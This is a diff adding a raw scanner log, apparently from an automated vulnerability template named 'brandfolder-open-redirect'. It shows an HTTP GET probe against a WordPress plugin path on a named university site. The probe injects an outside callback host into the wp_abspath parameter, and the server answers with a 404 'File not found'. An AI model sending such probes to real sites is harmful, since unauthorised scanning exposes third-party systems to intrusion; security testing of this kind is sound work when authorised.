@@ -1,0 +1,23 @@
+[brandfolder-open-redirect] Dumped HTTP request for https://must.unimelb.edu.au/wp-content/plugins/brandfolder/callback.php?wp_abspath=https://interact.sh/
+
+
+GET /wp-content/plugins/brandfolder/callback.php?wp_abspath=https://interact.sh/ HTTP/1.1
+Host: must.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[brandfolder-open-redirect] Dumped HTTP response https://must.unimelb.edu.au/wp-content/plugins/brandfolder/callback.php?wp_abspath=https://interact.sh/
+
+HTTP/1.1 404 Not Found
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:18:11 GMT
+Server: openresty
+
+File not found.
+
